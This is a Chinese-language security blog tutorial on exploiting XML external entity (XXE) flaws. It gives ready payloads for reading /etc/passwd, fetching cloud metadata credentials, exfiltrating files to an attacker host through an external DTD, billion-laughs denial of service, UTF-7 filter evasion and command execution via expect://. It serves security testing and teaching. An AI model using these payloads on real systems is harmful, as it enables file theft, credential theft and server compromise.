#  XXE：高级 XXE 漏洞利用完整指南   
原创 红云谈安全  红云谈安全   2025-05-25 11:24  
  
XML 外部实体 (XXE) 漏洞是现代 Web 应用程序中最容易被忽视但影响却巨大的漏洞之一。尽管这些漏洞似乎越来越难以检测和利用，但其影响依然严重，通常允许攻击者读取内部文件、访问仅限内部的网络，在严重的情况下甚至执行远程代码执行！  
  
在本文中，我们将了解什么是 XXE 漏洞以及如何识别和利用它们。我们还将介绍一些高级案例。  
  
让我们开始吧！  
## 什么是 XML 外部实体 (XXE) 注入漏洞？  
  
XML 外部实体 (XXE) 注入是一种漏洞，它允许攻击者操纵 XML 数据，意图利用解析器的功能。这通常会导致攻击者能够诱使存在漏洞的应用程序组件与任意主机建立 HTTP 连接（即服务器[端请求伪造）、读取内部文件，甚至在严重的情况下，通过获取对主机的访问权限。  
  
知道 XXE 注入源于 XML 解析期间对用户输入的验证不充分，我们可以轻松列出一些通常容易受到 XXE 漏洞影响的应用程序组件。  
## 识别 XML 外部实体 (XXE) 注入漏洞  
- 基于 XML 的 Web 服务（接受和处理 XML 格式数据的 SOAP、REST 和 RPC API）  
  
- 任何以 XML 格式传递或接受数据的导入/导出功能  
  
- RSS/Atom feed 处理器  
  
- 文档查看器/转换器（任何接受基于 XML 的文档的功能，例如 DOCX、XLSX 等）  
  
- 文件上传处理 XML（例如 SVG 图像处理器）  
  
一个经验法则是始终寻找任何能够接受和处理 XML 格式任意数据的潜在应用程序组件。某些 REST API （无意中）配置为接受多种格式的数据，包括 XML。始终值得测试。  
  
XXE！自动化还是手动搜索？ 一个简单快捷的小技巧，就能让你遇到 XXE：在你的代理拦截器中，添加一个匹配替换规则，将内容类型“application/json”更改为“text/xml”。现在你只需要查找 XML 解析错误😎  
  
![图像](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tjGQq4Ul9tBW6rnZPANQE6qrt2iar4ZianVDoqMRuJhPFKWCZ8RSxFoPA/640?wx_fmt=jpeg&from=appmsg "")  
  
图像  
  
2023 年 9 月 25 日 下午 5:47  
  
**287****回复****复制链接**  
  
**阅读 6 条回复**  
  
现在我们知道了什么是 XXE 漏洞以及在哪里可以找到它们，让我们来看看一些可以利用它们的方法。  
## 利用简单的XXE漏洞  
  
让我们首先通过易受攻击的组件来理解XXE漏洞。看一下以下易受攻击的代码片段：  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTE5IiBoZWlnaHQ9IjMzNTQiPjwvc3ZnPg==)![Simple vulnerable code snippet case featuring an XML external entity (XXE) injection vulnerability](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2t4Ed9FE9UOIrsIichY89SD7X0fD8Bml0ShxWVAaurZ6o6Xaex2mSoldg/640?wx_fmt=png&from=appmsg "")  
  
  
具有 XML 外部实体 (XXE) 注入漏洞的简单易受攻击的代码片段案例  
  
分析上面的代码片段，我们可以发现一些问题：  
- 没有足够的用户输入验证  
  
- XML 解析器支持 XML 实体（见LIBXML_NOENT  
标志）  
  
- XML 解析器配置为自动加载外部 DTD（文档类型定义，参见LIBXML_DTDLOAD  
标志）  
  
这三个条件都有助于 XXE 攻击。发送如下所示的恶意负载，我们就能轻松加载我们在外部实体 ( xxe  
) 中指定的本地文件：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>    <post>        <post_title>&xxe;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
![img](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9Ijg1MyI+PC9zdmc+)![Exploiting a simple XML external entity (XXE) injection vulnerability](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMFRFPRJX98ia00XWgcpicuk2tOxmIick1BP6zJ2HsDFeMxMBL5tmNQwZX8ajN2bDYRdNy8YsUdJaW8Nw/640?wx_fmt=png&from=appmsg "")  
  
  
利用简单的 XML 外部实体 (XXE) 注入漏洞  
### XXE 到 SSRF  
  
类似地，我们不仅可以声明本地文件的路径，还可以包含任意主机的 URL 来执行服务器端请求伪造攻击并获取响应。  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY ssrf SYSTEM "https://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><data>    <post>        <post_title>&ssrf;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
当然，像上面提到的这样容易受到简单 XXE 注入漏洞攻击的应用程序组件非常少见。尤其是随着 Web 开发人员安全意识的提高，以及旨在主动缓解 XXE 等危险注入攻击的新原生安全功能的出现。  
  
让我们看一些更高级的例子。  
  
**提示！在本例中，我们通过反射整个用户输入数据对象简化了 XXE 攻击。在实际场景中，您更有可能尝试注入不同的参数并观察响应变化。**  
## 利用高级XXE漏洞  
### 利用外部 DTD 来利用 XXE  
  
在某些情况下，你会遇到一些目标会过滤掉file://  
协议，将其替换为空值或完全阻止它。为了绕过这种情况，我们可以利用 XML 中的一个特殊功能——文档类型定义 (DTD)。  
  
DTD 本质上是一个文件，它指定了我们在恶意 XML 结构中使用的实体。现在，我们不用像之前那样在本地声明它，然后让安全过滤器移除我们的file://  
协议。我们可以在外部文件中声明 DTD，从而完全绕过过滤。  
  
假设我们的服务器上托管了以下文档类型定义（DTD）文件：  
```
<!ENTITY % hostname SYSTEM "file:///etc/hostname"><!ENTITY % e "<!ENTITY &#x25; xxe SYSTEM 'http://example.com/?c=%hostname;'>">%e;%xxe;
```  
  
我们可以以一种方式制作我们的 XXE 有效载荷，使易受攻击的应用程序连接到我们的服务器，加载我们的恶意 DTD 文件，并执行其内容：  
```
<!DOCTYPE data [  <!ENTITY % xxe SYSTEM "https://example.com/xxe.dtd"> %xxe;]><data>    <post>        <post_title>...</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
使用这种方法，我们不再需要file://  
向易受攻击的服务器指定被阻止的协议，同时仍然能够泄露内部文件的内容！  
### 利用参数实体进行盲 XXE  
  
一些开发人员尝试采取主动措施来抵御 XXE 攻击，并尝试从用户输入中剥离实体。众所周知，XML 实体（相当于变量）的声明和使用格式如下：  
```
<!DOCTYPE root [  <!ENTITY name "This text will replace &name; when used">]><root>&name;</root>
```  
  
过滤掉“与”符号 ( &  
) 通常看起来合乎逻辑。然而，我们可以通过利用参数实体轻松绕过这个问题。参数实体用百分号 ( <!ENTITY % name "value">  
) 定义，引用语法如下：%name;  
  
并且它们只能在 DTD 本身中引用，下面是使用参数实体加载外部资源的 XXE 有效负载的示例：  
```
<!DOCTYPE root [  <!ENTITY % xxe SYSTEM "http://example.com/"> %xxe;]><root></root>
```  
  
通过这种方法，我们可以使用参数实体来绕过阻止常规外部实体的保护和过滤器。  
### 通过资源耗尽来利用 XXE（“十亿笑声”攻击）  
  
正如我们之前提到的，XML 解析器中的安全配置错误可能会开启新的攻击向量，并允许我们利用 XXE 漏洞。在某些情况下，当实体扩展限制未设置时，我们实际上可以利用这一点来指数级扩展外部实体。  
  
指数实体扩展（更广为人知的名称是“十亿笑声”攻击）利用递归实体声明，导致高内存消耗甚至系统崩溃：  
```
<!DOCTYPE root [  <!ENTITY e "e">  <!ENTITY e1 "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">  <!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">  <!ENTITY e3 "&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;">  <!-- ... -->]><root>&e3;</root>
```  
  
这种攻击特别危险，因为有效载荷本身相当小，并且扩展发生在解析期间，但可能完全压垮服务器资源。  
  
**提示！测试拒绝服务 (DoS) 攻击时，请务必遵守程序指南，并且仅在允许的情况下进行！**  
### 通过UTF-7编码利用XXE  
  
你可能已经注意到了，在我们所有的XXE载荷中，我们都只使用了UTF-8编码。正如我们之前所见，一些过滤规则主要包括删除恶意关键字和语法符号。  
  
但是，如果解析器配置为接受多种字符编码，我们实际上可以发送以 UTF-7 而不是 UTF-8 字符集编码的恶意有效载荷：  
```
<?xml version="1.0" encoding="UTF-7"?>+ADw-+ACE-DOCTYPE+ACA-data+ACA-+AFs-+AAo-+ACA-+ACA-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-title+AD4-+ACY-xxe+ADs-+ADw-/post+AF8-title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-desc+AD4-xyz+ADw-/post+AF8-desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4-
```  
  
这种方法可以帮助我们绕过一些输入验证限制，特别是基于黑名单关键字过滤的系统，以防止 XXE 注入攻击。  
  
**提示！请记住在有效负载中包含 XML 序言，并将编码设置为“UTF-7”！**  
### 将 XXE 升级为远程代码执行  
  
在某些情况下，我们不仅可以读取系统文件或访问内部网络，还可以进行其他操作。例如，当启用了 Expect PHP 模块时，我们实际上可以使用包装器来执行系统命令：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY exec SYSTEM "expect://whoami">]><data>    <post>        <post_title>whoami: &exec;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
这个特定的 PHP 模块允许开发人员通过 PTY 与进程进行交互。我们还可以使用其他几个包装器来升级我们最初的 XXE 漏洞：  
- PHP 过滤器包装器  
  
- PHP 档案包装器 (PHAR)  
  
- ZIP/JAR 包装器（用于读取档案中的文件）  
  
- 数据  
  
- 地鼠  
  
- FTP  
  
- 字典  
  
让我们详细探讨其中的一些。  
#### PHP 过滤器包装器  
  
PHP 过滤器包装器是 PHP 过滤器扩展的一部分，旨在帮助开发人员过滤、清理和验证数据。我们可以使用此包装器读取本地文件（例如 PHP 源代码）：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">]><data>    <post>        <post_title>&xxe;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
这个 PHP 过滤器会将我们的 PHP 文件的内容以 base64 进行编码并将其返回给我们。  
#### PHP 存档包装器 (PHAR)  
  
PHAR 流包装器是 PHP Archive Wrapper 扩展的一部分，它允许开发人员访问 PHAR 文件（编译成单个文件的 PHP 应用程序或库）内的文件。我们可以使用此包装器来获取内部 PHAR 文件中 PHP 文件的内容：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [  <!ENTITY xxe SYSTEM "phar:///path/to/file.phar/internal/file.php">]><data>    <post>        <post_title>&xxe;</post_title>        <post_desc>...</post_desc>    </post></data>
```  
  
该包装器还可以帮助触发不安全的反序列化漏洞。  
  
**提示！请记住，某些包装器并非原生支持，需要先启用扩展/模块才能使用！**  
### 二阶XXE注入  
  
二阶XXE注入是XXE攻击的一种更复杂的变体，其中恶意有效载荷首先被存储，然后被检索和执行。由于二阶漏洞的执行不可预测且延迟，其更难以识别和利用。  
  
例如，导入功能通常就是这种情况。这类功能通常开发为异步运行。首先，你通过上传恶意输入文件来提供它。接下来，你的导入请求将被排队，直到后台工作程序（易受攻击的组件）处理你的有效载荷。  
  
一个经验法则是确保跟踪整个 Web 应用程序或 API 中的所有 XML 数据流，而不仅仅是入口点。这种方法还能确保您测试潜在的二阶 SQL 注入漏洞。  
## 结论  
  
XXE 漏洞仍然存在于 Web 应用程序中，但由于安全措施的加强以及开发人员安全意识的提高，这些漏洞更难被发现。测试目标是否存在潜在的 XXE 漏洞始终是一个好主意，尤其是针对本文提到的所有利用方法。  
  
  
